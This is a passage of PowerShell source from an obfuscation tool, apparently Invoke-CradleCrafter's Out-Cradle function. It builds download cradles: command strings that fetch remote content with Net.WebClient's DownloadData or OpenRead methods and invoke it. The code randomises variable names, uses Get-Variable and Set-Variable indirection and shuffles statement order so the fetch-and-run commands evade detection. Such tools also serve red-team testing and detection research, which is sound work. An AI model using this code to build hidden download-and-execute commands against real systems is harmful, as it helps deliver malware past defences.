            # If last option in $TokenArray is ALL then we will choose the highest value for $Rearrange in the below block since each Cradle can have differing numbers of $Rearrange values.
            If($AllOptionSelected) {$Rearrange = 3}
            Switch($Rearrange)
            {
                1 {
                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                      
                    $DownloadData         = $DownloadData.Replace(        $NewObjectNetWebClientTag,"($NewObjectTag`Net.WebClient)")
                    $DownloadDataWithTags = $DownloadDataWithTags.Replace($NewObjectNetWebClientTag,"($NewObjectTag`Net.WebClient)")
                    $DownloadData         = $DownloadData.Replace(        $NewObjectTag,$NewObject.Replace($ModuleAutoLoadTag,''))
                    $DownloadDataWithTags = $DownloadDataWithTags.Replace($NewObjectTag,$NewObjectWithTags.Replace($ModuleAutoLoadTag,''))

                    # Add .Invoke to the end of $DownloadData and $DownloadDataWithTags if $DownloadData ends with ')'.
                    If($DownloadData.EndsWith(')'))
                    {
                        $DownloadData = $DownloadData + '.Invoke'
      
                        If($DownloadDataWithTags.EndsWith('0>>>')) {$DownloadDataWithTags = $DownloadDataWithTags.SubString(0,$DownloadDataWithTags.LastIndexOf('0>>>')) + '.Invoke0>>>'}
                        Else                                       {$DownloadDataWithTags = $DownloadDataWithTags + '.Invoke'}
                    }

                    # Handle embedded tagging.
                    If($ByteWithTags.StartsWith('<<<0') -AND $ByteWithTags.EndsWith('0>>>'))
                    {
                        $ByteWithTags = $ByteWithTags.Replace($ByteTag,('0>>>' + $ByteTag + '<<<0'))
                    }
                    If($JoinWithTags.StartsWith('<<<0') -AND $JoinWithTags.EndsWith('0>>>'))
                    {
                        $JoinWithTags = $JoinWithTags.Replace($JoinTag,('0>>>' + $JoinTag + '<<<0'))
                    }

                    $SyntaxToInvoke         = $Join.Replace($JoinTag,$Byte.Replace($ByteTag,'(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "Net.WebClient).$DownloadData('$Url')"))
                    $SyntaxToInvokeWithTags = $JoinWithTags.Replace($JoinTag,$ByteWithTags.Replace($ByteTag,'(' + $NewObjectWithTags.Replace($ModuleAutoLoadTag,'') + "Net.WebClient).$DownloadDataWithTags('$UrlWithTags')"))
                      
                    If(($Invoke.Contains($CommandTag) -AND $InvokeWithTags.Contains($CommandTag)) -OR ($Invoke.Contains($CommandEscapedStringTag) -AND $InvokeWithTags.Contains($CommandEscapedStringTag)))
                    {
                        $CradleSyntax         = $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        $CradleSyntaxWithTags = $InvokeWithTags.Replace($InvokeTag,$SyntaxToInvokeWithTags).Replace($CommandTag, $CommandWithTags).Replace($CommandEscapedStringTag,$CommandEscapedString)
                    }
                    Else
                    {
                        If($Command) {$Command = ';' + $Command; $CommandWithTags = ';' + $CommandWithTags}
                        $CradleSyntax         = $Invoke.Replace($InvokeTag,$SyntaxToInvoke) + $Command
                        $CradleSyntaxWithTags = $InvokeWithTags.Replace($InvokeTag,$SyntaxToInvokeWithTags) + $CommandWithTags
                    }

                    If($NewObject.Contains($ModuleAutoLoadTag))
                    {
                        $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                        If($NewObject.EndsWith('0>>>'))
                        {
                            $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                        }
                    }
                    Else
                    {
                        $CurrentModuleAutoLoadRandom = ''
                    }
                    $CradleSyntax         = $CurrentModuleAutoLoadRandom + $CradleSyntax
                    $CradleSyntaxWithTags = $CurrentModuleAutoLoadRandom + $CradleSyntaxWithTags
                }
                2 {
                    # Syntax concatenate into logical variable count and names with default variable GET/SET syntax.
                      
                    # Set more logical variable names for this block.
                    $RandomVarName1 = 'wc'  # WebClient
                    $RandomVarName2 = 'url' # Url
                    $RandomVarName3 = 'wc2' # WebClient (Argument)
                    $RandomVarName4 = 'ds'  # DownloadData (Method)

                    $VarOptionsIndex  = 0
                    $NumberOfVarNames = 4

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    $DownloadData         = $DownloadData.Replace(        $NewObjectNetWebClientTag,$GetVar1)
                    $DownloadDataWithTags = $DownloadDataWithTags.Replace($NewObjectNetWebClientTag,$GetVar1WithTags)

                    # Add .Invoke to the end of $GetVar4 and $GetVar4WithTags.
                    $GetVar4WithTags = $GetVar4WithTags.Replace($GetVar4,($GetVar4 + '.Invoke'))
                    $GetVar4         = $GetVar4 + '.Invoke'
                      
                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NewObject','DownloadData','Join','Byte')
                    For($i=1; $i -le 2; $i++)
                    {
                        # Encapsulate DownloadData in single quotes if basic syntax is used.
                        If($DownloadData.Contains('DownloadData'))
                        {
                            $DownloadDataWithTags = $DownloadDataWithTags.Trim("'").Replace($DownloadData,("'" + $DownloadData + "'")).Replace("''","'")
                            $DownloadData         = "'" + $DownloadData.Trim("'") + "'"
                        }
  
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}

                            # Handle embedded tagging.
                            If($Byte.StartsWith('<<<0') -AND $Byte.EndsWith('0>>>'))
                            {
                                $Byte = $Byte.Replace($ByteTag,('0>>>' + $ByteTag + '<<<0'))
                            }
                            If($Join.StartsWith('<<<0') -AND $Join.EndsWith('0>>>'))
                            {
                                $Join = $Join.Replace($JoinTag,('0>>>' + $JoinTag + '<<<0'))
                            }
                        }
                          
                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar3'Net.WebClient'"
                        $CommandArray += "$SetVar2'$Url'"

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "$GetVar3)"

                        $CommandArray += "$SetVar4$DownloadData"

                        $SyntaxToInvoke = "$GetVar1.$GetVar4($GetVar2)"
                        $SyntaxToInvoke = $Join.Replace($JoinTag,$Byte.Replace($ByteTag,$SyntaxToInvoke))

                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }
                          
                        # Remove single quotes when DownloadString is used directly as a method instead of a string stored in a variable (as in above command arrangement).
                        While($DownloadData.Contains("'DownloadData'"))
                        {
                            $DownloadData = $DownloadData.Replace("'DownloadData'","DownloadData")
                        }

                        If($DownloadData.EndsWith(')') -OR $DownloadData.EndsWith(')0>>>'))
                        {
                            $DownloadDataInvoke = $DownloadData + '.Invoke'
                        }
                        Else
                        {
                            $DownloadDataInvoke = $DownloadData
                        }

                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()

                        $CommandArray2 += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "Net.WebClient)"
                        $CommandArray2 += "$SetVar2'$Url'"

                        $SyntaxToInvoke = "$GetVar1.$DownloadDataInvoke($GetVar2)"
                        $SyntaxToInvoke = $Join.Replace($JoinTag,$Byte.Replace($ByteTag,$SyntaxToInvoke))

                        $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                          
                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = ($CommandArray[$ArrayIndexOrder_01]   + $CommandArray[2,3,4,5] -Join ';')}
                            2 {$Syntax = ($CommandArray2[$Array2IndexOrder_01] + $CommandArray2[2,3]    -Join ';')}
                        }

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                3 {
                    # Syntax concatenate into logical variable count but random names with obfuscated variable GET/SET syntax.
                      
                    $VarOptionsIndex  = 1
                    $NumberOfVarNames = 4

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }
                      
                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    $DownloadData         = $DownloadData.Replace(        $NewObjectNetWebClientTag,$GetVar1)
                    $DownloadDataWithTags = $DownloadDataWithTags.Replace($NewObjectNetWebClientTag,$GetVar1WithTags)

                    # Encapsulate DownloadData in single quotes if basic syntax is used. Then add .Invoke to GetVar4.
                    If($DownloadData -eq 'DownloadData')
                    {
                        $DownloadDataWithTags = $DownloadDataWithTags.Replace($DownloadData,("'" + $DownloadData + "'"))
                        $DownloadData         = "'" + $DownloadData + "'"
                    }
                      
                    # Add .Invoke to the end of $GetVar4 and $GetVar4WithTags.
                    $GetVar4WithTags = $GetVar4WithTags.Replace($GetVar4,'(' + $GetVar4 + ').Invoke')
                    $GetVar4         = '(' + $GetVar4 + ').Invoke'
                      
                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NewObject','DownloadData','Join','Byte')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            # Set each 'WithTags' variable values to non-'WithTags' variable names for simplicity.
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}

                            # Handle embedded tagging.
                            If($Byte.StartsWith('<<<0') -AND $Byte.EndsWith('0>>>'))
                            {
                                $Byte = $Byte.Replace($ByteTag,('0>>>' + $ByteTag + '<<<0'))
                            }
                            If($Join.StartsWith('<<<0') -AND $Join.EndsWith('0>>>'))
                            {
                                $Join = $Join.Replace($JoinTag,('0>>>' + $JoinTag + '<<<0'))
                            }
                        }
                          
                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar3'Net.WebClient'"
                        $CommandArray += "$SetVar2'$Url'"

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "$GetVar3)"

                        $CommandArray += "$SetVar4$DownloadData"

                        $SyntaxToInvoke = "$GetVar1.$GetVar4($GetVar2)"
                        $SyntaxToInvoke = $Join.Replace($JoinTag,$Byte.Replace($ByteTag,$SyntaxToInvoke))

                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }
    
                        # Add .Invoke to the end of $DownloadData if not default value of 'DownloadData'.
                        If($DownloadData.Contains("'DownloadData'"))
                        {
                            # Remove single quotes when DownloadData is used directly as a method instead of a string stored in a variable (as in above command arrangement).  
                            $DownloadData = $DownloadData.Replace("'DownloadData'","DownloadData")
                        }
                        Else
                        {
                            If($DownloadData.EndsWith('0>>>')) {$DownloadData = $DownloadData.SubString(0,$DownloadData.LastIndexOf('0>>>')) + '.Invoke0>>>'}
                            Else                               {$DownloadData = $DownloadData + '.Invoke'}
                        }
                      
                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()

                        $CommandArray2 += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "Net.WebClient)"
                        $CommandArray2 += "$SetVar2'$Url'"

                        $SyntaxToInvoke = "$GetVar1.$DownloadData($GetVar2)"
                        $SyntaxToInvoke = $Join.Replace($JoinTag,$Byte.Replace($ByteTag,$SyntaxToInvoke))

                        $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = ($CommandArray[$ArrayIndexOrder_01]   + $CommandArray[2,3,4,5] -Join ';')}
                            2 {$Syntax = ($CommandArray2[$Array2IndexOrder_01] + $CommandArray2[2,3]    -Join ';')}
                        }

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                default {Write-Error "An invalid `$Rearrange value ($Rearrange) was passed to switch block for Out-Cradle `$Cradle value ($Cradle)."; Exit}
            }

            # Add final cradle syntax (with and without tags) and update token value to $CradleSyntaxOptions to be returned if -ReturnAsArray Switch was specified.
            $CradleSyntaxOptions = @($CradleSyntax,$CradleSyntaxWithTags,$TokenValueUpdatedThisIteration)
        }
        3 {
            #########################################
            ## New-Object Net.WebClient - OpenRead ##
            #########################################

            # Switch block for changing overall syntax arrangement depending on the level passed in with the REARRANGE option.
            # If last option in $TokenArray is ALL then we will choose the highest value for $Rearrange in the below block since each Cradle can have differing numbers of $Rearrange values.
            If($AllOptionSelected) {$Rearrange = 2}
            Switch($Rearrange)
            {
                1 {
                    # Syntax concatenate into logical variable count and names with default variable GET/SET syntax.
                      
                    # Set more logical variable names for this block.
                    $RandomVarName1 = 'wr'  # WebRequest
                    $RandomVarName2 = 'url' # Url
                    $RandomVarName3 = 'wc'  # WebClient (Argument)
                    $RandomVarName4 = 'or'  # OpenRead (Method)
                    $RandomVarName5 = 'sr'  # StreamReader
                    $RandomVarName6 = 'res' # Result

                    $VarOptionsIndex  = 0
                    $NumberOfVarNames = 6

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex

                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }
                      
                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    $OpenRead         = $OpenRead.Replace(        $NewObjectNetWebClientTag,$GetVar1)
                    $OpenReadWithTags = $OpenReadWithTags.Replace($NewObjectNetWebClientTag,$GetVar1WithTags)

                    # Extra variables for Stream fringe case. More complicated than it should be but worth it to break out Stream into its own obfuscation type instead of being baked into Rearrange type.
                    $OpenReadForStream         = $OpenRead
                    $OpenReadForStreamWithTags = $OpenReadWithTags

                    # Add .Invoke to $OpenReadForStream.
                    If($OpenReadForStream -ne 'OpenRead')
                    {
                        If($OpenReadForStreamWithTags.EndsWith('0>>>')) {$OpenReadForStreamWithTags = $OpenReadForStreamWithTags.SubString(0,$OpenReadForStreamWithTags.LastIndexOf('0>>>')) + '.Invoke0>>>'}
                        Else                                            {$OpenReadForStreamWithTags = $OpenReadForStreamWithTags + '.Invoke'}
                        $OpenReadForStream = $OpenReadForStream + '.Invoke'
                    }

                    # Encapsulate OpenRead in single quotes if basic syntax is used. Then add .Invoke to GetVar4.
                    If($OpenRead -eq 'OpenRead')
                    {
                        $OpenReadWithTags = $OpenReadWithTags.Replace($OpenRead,("'" + $OpenRead + "'"))
                        $OpenRead         = "'" + $OpenRead + "'"
                    }

                    # Add .Invoke to the end of $GetVar4 and $GetVar4WithTags.
                    $GetVar4WithTags = $GetVar4WithTags.Replace($GetVar4,$GetVar4 + '.Invoke')
                    $GetVar4         = $GetVar4 + '.Invoke'

                    # Add encapsulating parentheses if non-default variable syntax is used.                      
                    If(!$GetVar4.StartsWith('$'))
                    {
                        $GetVar4WithTags = $GetVar4WithTags.Replace($GetVar4,('(' + $GetVar4 + ')'))
                        $GetVar4 = '(' + $GetVar4 + ')'
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NewObject','OpenRead','OpenReadForStream','Stream')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            # Set each 'WithTags' variable values to non-'WithTags' variable names for simplicity.
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }

                        $Response = "$GetVar1.$GetVar4($GetVar2)"

                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $Stream = $Stream.Replace($NewObjectNetWebClientTag,($NewObject + 'Net.WebClient'))
                        $Stream = $Stream.Replace($NewObjectTag,$NewObject)
                        $Stream = $Stream.Replace($OpenReadTag,$OpenReadForStream)
                        $Stream = $Stream.Replace($UrlTag,$Url)
                        $Stream = $Stream.Replace($GetVar1,($NewObject + 'Net.WebClient'))
                        $Stream = $Stream.Replace($ResponseTag,$Response)
                        $Stream = $Stream.Replace($SRSetVarTag,$SetVar5)
                        $Stream = $Stream.Replace($SRGetVarTag,$GetVar5)
                        $Stream = $Stream.Replace($ResultSetVarTag,$SetVar6)
                        $Stream = $Stream.Replace($ResultGetVarTag,$GetVar6)
                        $Stream = $Stream.Replace($WRSetVarTag,$SetVar1)
                        $Stream = $Stream.Replace($WRGetVarTag,$GetVar1)

                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar3'Net.WebClient'"
                        $CommandArray += "$SetVar2'$Url'"

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "$GetVar3)"

                        $CommandArray += "$SetVar4$OpenRead"

                        # Local-only copy of $ArrayIndexOrder_01 in case Invoke option below needs to update it for Invoke but not update this value being returned to Invoke-CradleCrafter.
                        $ArrayIndexOrder_01_LOCAL = $ArrayIndexOrder_01

                        # SPECIAL CASE: If $Stream is a one-liner (no ';' in $Stream) then replace current $CommandArray with just the $Stream one-liner.
                        If(!$Stream.Contains(';'))
                        {
                            $CommandArray  = @()
                            # Overwrite the ordering of the first two array elements since now there will only be 1-2 elements in $CommandArray.
                            $ArrayIndexOrder_01_LOCAL = @(0,1)
                            $SyntaxToInvoke = $Stream
                        }
                        ElseIf($Stream.Contains('While') -AND $Stream.Contains('Try') -AND $Stream.Contains('Catch'))
                        {
                            $CommandArray += "$SetVar1$GetVar1.$GetVar4($GetVar2)"

                            $CommandArray += $Stream
                            $SyntaxToInvoke = $GetVar6
                        }
                        Else
                        {
                            # Default option.
                            $CommandArray += $Stream
                            $SyntaxToInvoke = $GetVar6
                        }

                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        # Add .Invoke to the end of $OpenRead if not default value of 'OpenRead'.
                        If($OpenRead.Contains("'OpenRead'"))
                        {
                            # Remove single quotes when OpenRead is used directly as a method instead of a string stored in a variable (as in above command arrangement).  
                            $OpenRead = $OpenRead.Replace("'OpenRead'","OpenRead")
                        }
                        Else
                        {
                            If($OpenRead.EndsWith('0>>>')) {$OpenRead = $OpenRead.SubString(0,$OpenRead.LastIndexOf('0>>>')) + '.Invoke0>>>'}
                            Else                           {$OpenRead = $OpenRead + '.Invoke'}
                        }
                      
                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()

                        $CommandArray2 += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "Net.WebClient)"
                        $CommandArray2 += "$SetVar2'$Url'"

                        # Local-only copy of $Array2IndexOrder_01 in case Invoke option below needs to update it for Invoke but not update this value being returned to Invoke-CradleCrafter.
                        $Array2IndexOrder_01_LOCAL = $Array2IndexOrder_01

                        # SPECIAL CASE: If $Stream is a one-liner (no ';' in $Stream) then replace current $CommandArray with just the $Stream one-liner.
                        If(!$Stream.Contains(';'))
                        {
                            $CommandArray2  = @()
                            # Overwrite the ordering of the first two array elements since now there will only be 1-2 elements in $CommandArray2.
                            $Array2IndexOrder_01_LOCAL = @(0,1)
                            $SyntaxToInvoke = $Stream
                        }
                        ElseIf($Stream.Contains('While') -AND $Stream.Contains('Try') -AND $Stream.Contains('Catch'))
                        {
                            $CommandArray2 += "$SetVar1$GetVar1.$OpenRead($GetVar2)"
                            $CommandArray2 += $Stream
                            $SyntaxToInvoke = $GetVar6
                        }
                        Else
                        {
                            # Default option.
                            $CommandArray2 += $Stream.Replace($GetVar4,$OpenRead)
                            $SyntaxToInvoke = $GetVar6
                        }

                        $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = ($CommandArray[$ArrayIndexOrder_01_LOCAL]   + $CommandArray[2,3,4,5,6,7] -Join ';')}
                            2 {$Syntax = ($CommandArray2[$Array2IndexOrder_01_LOCAL] + $CommandArray2[2,3,4,5]    -Join ';')}
                        }

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                2 {
                    # Syntax concatenate into logical variable count but random names with obfuscated variable GET/SET syntax.
                      
                    $VarOptionsIndex  = 1
                    $NumberOfVarNames = 6

                    # Since we may have += syntax if Stream option 3 is chosen, we keep getting randomized GET/SET variable syntax until $GetVar6 is an acceptable syntax.
                    # (Get-Variable VARNAME).Value+= is acceptable, but errors occur when the syntax is (Get-Variable VARNAME -ValueOnly)+=
                    Do
                    {
                        # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                        $VarsUsedInThisBlock  = @()
                        $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex

                        # Set all new variables from above function to current variable context (from script-level to normal-level).
                        For($k=1; $k -le $NumberOfVarNames; $k++)
                        {
                            ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                        }
                    }
                    Until(!$GetVar6.Contains(' -V'))

                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    $OpenRead         = $OpenRead.Replace(        $NewObjectNetWebClientTag,$GetVar1)
                    $OpenReadWithTags = $OpenReadWithTags.Replace($NewObjectNetWebClientTag,$GetVar1WithTags)

                    # Extra variables for Stream fringe case. More complicated than it should be but worth it to break out Stream into its own obfuscation type instead of being baked into Rearrange type.
                    $OpenReadForStream         = $OpenRead
                    $OpenReadForStreamWithTags = $OpenReadWithTags

                    # Add .Invoke to $OpenReadForStream.
                    If($OpenReadForStream -ne 'OpenRead')
                    {
                        If($OpenReadForStreamWithTags.EndsWith('0>>>')) {$OpenReadForStreamWithTags = $OpenReadForStreamWithTags.SubString(0,$OpenReadForStreamWithTags.LastIndexOf('0>>>')) + '.Invoke0>>>'}
                        Else                                            {$OpenReadForStreamWithTags = $OpenReadForStreamWithTags + '.Invoke'}
                        $OpenReadForStream = $OpenReadForStream + '.Invoke'
                    }

                    # Encapsulate OpenRead in single quotes if basic syntax is used. Then add .Invoke to GetVar4.
                    If($OpenRead -eq 'OpenRead')
                    {
                        $OpenReadWithTags = $OpenReadWithTags.Replace($OpenRead,("'" + $OpenRead + "'"))
                        $OpenRead         = "'" + $OpenRead + "'"
                    }

                    # Add .Invoke to the end of $GetVar4 and $GetVar4WithTags.
                    $GetVar4WithTags = $GetVar4WithTags.Replace($GetVar4,$GetVar4 + '.Invoke')
                    $GetVar4         = $GetVar4 + '.Invoke'

                    # Add encapsulating parentheses if non-default variable syntax is used.                      
                    If(!$GetVar4.StartsWith('$'))
                    {
                        $GetVar4WithTags = $GetVar4WithTags.Replace($GetVar4,('(' + $GetVar4.Replace('.Invoke',').Invoke')))
                        $GetVar4 = '(' + $GetVar4.Replace('.Invoke',').Invoke')
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NewObject','OpenRead','OpenReadForStream','Stream')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            # Set each 'WithTags' variable values to non-'WithTags' variable names for simplicity.
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }

                        $Response = "$GetVar1.$GetVar4($GetVar2)"

                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $Stream = $Stream.Replace($NewObjectNetWebClientTag,($NewObject + 'Net.WebClient'))
                        $Stream = $Stream.Replace($NewObjectTag,$NewObject)
                        $Stream = $Stream.Replace($OpenReadTag,$OpenReadForStream)
                        $Stream = $Stream.Replace($UrlTag,$Url)
                        $Stream = $Stream.Replace($GetVar1,($NewObject + 'Net.WebClient'))
                        If($SetVar5.Contains(' '))
                        {
                            # Add extra parenthese for SetVar5 if it is a Set-Variable syntax (i.e. with whitespaces).
                            $Stream = $Stream.Replace($ResponseTag,($Response + ')'))
                            $Stream = $Stream.Replace($SRSetVarTag,($SetVar5 + '('))
                        }
                        Else
                        {
                            $Stream = $Stream.Replace($ResponseTag,$Response)
                            $Stream = $Stream.Replace($SRSetVarTag,$SetVar5)
                        }
                        $Stream = $Stream.Replace($SRGetVarTag,$GetVar5)
                        $Stream = $Stream.Replace($ResultSetVarTag,$SetVar6)
                        $Stream = $Stream.Replace($ResultGetVarTag,$GetVar6)
                        $Stream = $Stream.Replace($WRSetVarTag,$SetVar1)
                        $Stream = $Stream.Replace($WRGetVarTag,$GetVar1)

                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar3'Net.WebClient'"
                        $CommandArray += "$SetVar2'$Url'"

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "$GetVar3)"
                          
                        $CommandArray += "$SetVar4$OpenRead"

                        # Local-only copy of $ArrayIndexOrder_01 in case Invoke option below needs to update it for Invoke but not update this value being returned to Invoke-CradleCrafter.
                        $ArrayIndexOrder_01_LOCAL = $ArrayIndexOrder_01

                        # SPECIAL CASE: If $Stream is a one-liner (no ';' in $Stream) then replace current $CommandArray with just the $Stream one-liner.
                        If(!$Stream.Contains(';'))
                        {
                            $CommandArray  = @()
